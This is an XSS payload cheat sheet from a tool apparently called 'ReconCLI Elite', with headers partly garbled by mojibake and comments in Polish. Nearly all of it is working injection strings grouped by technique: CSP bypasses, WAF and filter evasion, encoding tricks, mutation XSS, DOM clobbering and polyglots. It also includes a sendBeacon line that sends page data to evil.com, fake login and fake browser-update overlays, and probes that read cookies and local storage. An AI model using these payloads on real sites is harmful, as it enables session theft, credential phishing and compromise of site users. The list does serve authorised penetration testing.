# üéØ XSS PAYLOADS - SPECIALIZED TECHNIQUES - ReconCLI Elite
# Zaawansowane techniki obej≈õcia zabezpiecze≈Ñ
# Data: 2025-07-19

# ==========================================
# üõ°Ô∏è CSP BYPASS TECHNIQUES
# ==========================================

# Whitelist bypass using jsonp
<script src="//accounts.google.com/o/oauth2/revoke?callback=alert"></script>

# Angular CSP bypass
{{constructor.constructor('alert(1)')()}}

# Using allowed domains
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js"></script>
<div ng-app ng-csp ng-click="$event.view.alert('CSP Bypass')">click</div>

# Base64 data URI when data: allowed
<script src="data:application/javascript,YWxlcnQoJ0NTUCBCeXBhc3MnKQ=="></script>

# Blob when blob: allowed
<script>var b=new Blob(['alert("CSP Blob")'],{type:'application/javascript'});var u=URL.createObjectURL(b);var s=document.createElement('script');s.src=u;document.head.appendChild(s)</script>

# Report-uri exfiltration
<script>navigator.sendBeacon('//evil.com/csp',JSON.stringify(window.location))</script>

# Event handler bypass
<input value="CSP" onclick="window['alert'](this.value)">

# Nonce bruteforce
<script nonce="1">alert('CSP Nonce')</script>
<script nonce="12">alert('CSP Nonce')</script>
<script nonce="123">alert('CSP Nonce')</script>

# ==========================================
# üèÉ‚Äç‚ôÇÔ∏è WAF EVASION TECHNIQUES
# ==========================================

# Cloudflare evasion
<svg/onload=self[`al`+`ert`]`WAF`>

# ModSecurity evasion
<img src=x onerror="window['al'+'ert']('WAF')">

# AWS WAF evasion
<script>Function('al'+'ert(1)')();</script>

# Generic WAF bypass with weird chars
<script>alert'1'</script>

# Tag confusion
</ScRiPt><ScRiPt>alert('WAF')</ScRiPt>

# Event handler obfuscation
<body onload="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">

# Comment injection
<script>/**/alert(/**/'WAF'/**/)</script>

# Whitespace confusion
<script>	
	alert('WAF')
</script>

# Concatenation bypass
<script>window['al'+'ert']('WAF')</script>

# ==========================================
# üîí FILTER BYPASS TECHNIQUES  
# ==========================================

# Keyword filter bypass
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

# Parentheses filter bypass
<script>alert`1`</script>

# Quotes filter bypass
<script>alert(String.fromCharCode(49))</script>

# Script tag filter bypass
<img src=x onerror=alert(1)>

# JavaScript filter bypass
<svg><script>alert(1)</script></svg>

# Attribute filter bypass
<input onfocus=alert(1) autofocus>

# Content filter bypass
<script>location='javas'+'cript:alert(1)'</script>

# HTML entity bypass
&lt;script&gt;alert(1)&lt;/script&gt;

# ==========================================
# üåê BROWSER-SPECIFIC BYPASSES
# ==========================================

# Chrome XSS Auditor bypass (legacy)
<script>alert(String.fromCharCode(88,83,83))</script>

# IE conditional comment
<!--[if IE]><script>alert('IE')</script><![endif]-->

# Firefox moz-binding (legacy)
<div style="-moz-binding:url(javascript:alert('Firefox'))">

# Safari WebKit bypass
<script>setTimeout(alert,0,'Safari')</script>

# Edge bypass
<script>alert(window.name||'Edge')</script>

# Mobile browser bypass
<meta name="viewport" content="width=device-width"><script>alert('Mobile')</script>

# ==========================================
# üì± MOBILE-SPECIFIC TECHNIQUES
# ==========================================

# iOS Safari bypass
<script>document.ontouchstart=()=>alert('iOS')</script>

# Android Chrome bypass
<script>window.DeviceMotionEvent&&alert('Android')</script>

# WebView bypass
<script>window.webkit?.messageHandlers||alert('WebView')</script>

# Touch event bypass
<div ontouchstart="eval(this.dataset.x)" data-x="alert('Touch')">Touch me</div>

# ==========================================
# üé≠ POLYGLOT TECHNIQUES
# ==========================================

# HTML/XML/SVG polyglot
'><svg onload=alert(1)>//

# JSON/JavaScript polyglot
{"a":"</script><script>alert(1)//"}

# CSS/JavaScript polyglot
</style><script>alert(1)</script><style>

# URL/JavaScript polyglot
javascript:alert(String.fromCharCode(88,83,83))

# Template polyglot
{{7*7}}${7*7}<%=7*7%>

# Markdown polyglot
[XSS](javascript:alert(1))

# ==========================================
# üîÑ MUTATION XSS TECHNIQUES
# ==========================================

# innerHTML mutation
<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>

# outerHTML mutation  
<div id="x"></div><script>document.getElementById('x').outerHTML='<img src=x onerror=alert(1)>'</script>

# insertAdjacentHTML mutation
<div id="x"></div><script>document.getElementById('x').insertAdjacentHTML('afterend','<img src=x onerror=alert(1)>')</script>

# Range mutation
<script>var r=document.createRange();r.setStart(document.body,0);r.createContextualFragment('<img src=x onerror=alert(1)>');document.body.appendChild(r.extractContents())</script>

# Document.write mutation
<script>document.write('<img src=x onerror=alert(1)>')</script>

# ==========================================
# üß¨ DOM CLOBBERING TECHNIQUES
# ==========================================

# Window property clobbering
<form name="alert"><input name="1"></form><script>window.alert(1)</script>

# Document property clobbering
<img name="implementation" src="x"><script>document.implementation</script>

# Element ID clobbering
<div id="location"></div><script>location</script>

# Form clobbering
<form name="document"></form><script>window.document</script>

# ==========================================
# üéØ CONTEXT-BREAKING TECHNIQUES
# ==========================================

# Break out of JavaScript string
';alert('XSS');//

# Break out of HTML attribute
" onmouseover="alert('XSS')" "

# Break out of CSS context
</style><script>alert('XSS')</script><style>

# Break out of comment
--><script>alert('XSS')</script><!--

# Break out of CDATA
]]><script>alert('XSS')</script><![CDATA[

# ==========================================
# üîó PROTOCOL HANDLER BYPASSES
# ==========================================

# Data protocol variations
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
data:text/html;charset=utf-8,<script>alert(1)</script>

# JavaScript protocol variations
javascript:alert(1)
jAvAsCrIpT:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)

# VBScript protocol
vbscript:alert(1)

# About protocol
about:blank

# ==========================================
# üé® ENCODING BYPASSES
# ==========================================

# Double URL encoding
%253Cscript%253Ealert(1)%253C/script%253E

# Mixed encoding
%3Cscript%3Ealert&#40;1&#41;%3C/script%3E

# Unicode normalization
<script>eval('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')</script>

# Hex escape
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

# Octal escape
<script>eval('\141\154\145\162\164\50\61\51')</script>

# ==========================================
# üöÄ MODERN BROWSER APIS
# ==========================================

# Service Worker XSS
<script>navigator.serviceWorker.register('data:application/javascript,importScripts("data:application/javascript,console.log(1)")')</script>

# Web Worker XSS
<script>new Worker('data:application/javascript,postMessage("alert(1)")')</script>

# Shared Worker XSS
<script>new SharedWorker('data:application/javascript,onconnect=e=>e.ports[0].postMessage("alert(1)")')</script>

# Module XSS
<script type="module">import('data:text/javascript,alert(1)')</script>

# Dynamic import XSS
<script>import('data:text/javascript,export default alert(1)').then(m=>m.default)</script>

# ==========================================
# üîÆ BLEEDING EDGE TECHNIQUES
# ==========================================

# CSS Houdini bypass
<script>CSS.paintWorklet?.addModule?.('data:application/javascript,alert(1)')</script>

# WebAssembly bypass
<script>WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,7,1,3,114,117,110,0,0,10,9,1,7,0,65,42,26,11])).then(m=>alert(1))</script>

# Trusted Types bypass
<script>if(window.trustedTypes){const p=trustedTypes.createPolicy('default',{createHTML:s=>s});document.body.innerHTML=p.createHTML('<img src=x onerror=alert(1)>')}</script>

# ==========================================
# üé≠ SOCIAL ENGINEERING XSS
# ==========================================

# Fake security warning
<script>alert('SECURITY WARNING: Your computer may be infected. Click OK to scan now.')</script>

# Fake browser update
<script>document.body.innerHTML='<div style="background:#ff0000;color:white;padding:20px;text-align:center;position:fixed;top:0;left:0;width:100%;z-index:9999">‚ö†Ô∏è CRITICAL: Browser Update Required - Click <a href="javascript:alert(\'XSS!\')" style="color:yellow">HERE</a> to update</div>'</script>

# Fake login form
<script>document.body.innerHTML='<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border:2px solid #333;box-shadow:0 0 20px rgba(0,0,0,0.8);z-index:9999;font-family:Arial"><h2>üîí Session Expired</h2><p>Please re-enter your credentials:</p><form><input type="text" placeholder="Username" style="display:block;margin:10px 0;padding:5px;width:200px"><input type="password" placeholder="Password" style="display:block;margin:10px 0;padding:5px;width:200px"><button type="button" onclick="alert(\'Credentials captured!\')" style="background:#0066cc;color:white;padding:10px 20px;border:none;cursor:pointer">Login</button></form></div>'</script>

# ==========================================
# üî¨ RESEARCH & TESTING VECTORS
# ==========================================

# All event handlers test
<div onabort=alert(1) onblur=alert(1) oncancel=alert(1) oncanplay=alert(1) oncanplaythrough=alert(1) onchange=alert(1) onclick=alert(1) onclose=alert(1) oncontextmenu=alert(1) oncuechange=alert(1) ondblclick=alert(1) ondrag=alert(1) ondragend=alert(1) ondragenter=alert(1) ondragleave=alert(1) ondragover=alert(1) ondragstart=alert(1) ondrop=alert(1) ondurationchange=alert(1) onemptied=alert(1) onended=alert(1) onerror=alert(1) onfocus=alert(1) onformdata=alert(1) oninput=alert(1) oninvalid=alert(1) onkeydown=alert(1) onkeypress=alert(1) onkeyup=alert(1) onload=alert(1) onloadeddata=alert(1) onloadedmetadata=alert(1) onloadstart=alert(1) onmousedown=alert(1) onmouseenter=alert(1) onmouseleave=alert(1) onmousemove=alert(1) onmouseout=alert(1) onmouseover=alert(1) onmouseup=alert(1) onpause=alert(1) onplay=alert(1) onplaying=alert(1) onprogress=alert(1) onratechange=alert(1) onreset=alert(1) onresize=alert(1) onscroll=alert(1) onseeked=alert(1) onseeking=alert(1) onselect=alert(1) onstalled=alert(1) onsubmit=alert(1) onsuspend=alert(1) ontimeupdate=alert(1) ontoggle=alert(1) onvolumechange=alert(1) onwaiting=alert(1) onwheel=alert(1)>Test all events</div>

# All HTML5 tags test
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<source src=x onerror=alert(1)>
<track src=x onerror=alert(1)>
<canvas onerror=alert(1)>
<svg onload=alert(1)>
<math onload=alert(1)>
<details ontoggle=alert(1) open>
<summary onclick=alert(1)>Click</summary>
</details>

# Protocol test suite
<a href="javascript:alert('javascript')">JS</a>
<a href="data:text/html,<script>alert('data')</script>">Data</a>
<a href="vbscript:alert('vbscript')">VBS</a>
<a href="about:blank" onclick="alert('about')">About</a>

# ==========================================
# üéØ REAL-WORLD SCENARIOS
# ==========================================

# Search injection
<script>if(location.search.includes('q='))alert('Search XSS: '+decodeURIComponent(location.search))</script>

# Hash fragment injection  
<script>if(location.hash)alert('Hash XSS: '+location.hash)</script>

# Referer injection
<script>alert('Referer: '+document.referrer)</script>

# Cookie injection
<script>alert('Cookies: '+document.cookie)</script>

# User-Agent injection (for server-side reflection)
<!-- Will be reflected server-side: Mozilla/5.0 <script>alert('UserAgent')</script> -->

# ==========================================
# üîç DEBUGGING & ANALYSIS
# ==========================================

# XSS detection probe
<script>console.log('XSS executed at:',new Date().toISOString());console.log('URL:',location.href);console.log('Cookies:',document.cookie);console.log('LocalStorage:',localStorage);console.log('SessionStorage:',sessionStorage);</script>

# Environment detection
<script>alert('Browser: '+navigator.userAgent+'\nCookies: '+document.cookie+'\nLocal Storage: '+JSON.stringify(localStorage))</script>

# Framework detection
<script>var frameworks=[];if(typeof jQuery!=='undefined')frameworks.push('jQuery '+jQuery.fn.jquery);if(typeof angular!=='undefined')frameworks.push('Angular '+angular.version.full);if(typeof React!=='undefined')frameworks.push('React '+React.version);if(typeof Vue!=='undefined')frameworks.push('Vue '+Vue.version);alert('Frameworks detected: '+(frameworks.length?frameworks.join(', '):'None'))</script>

# ==========================================
# END OF SPECIALIZED TECHNIQUES
# ==========================================
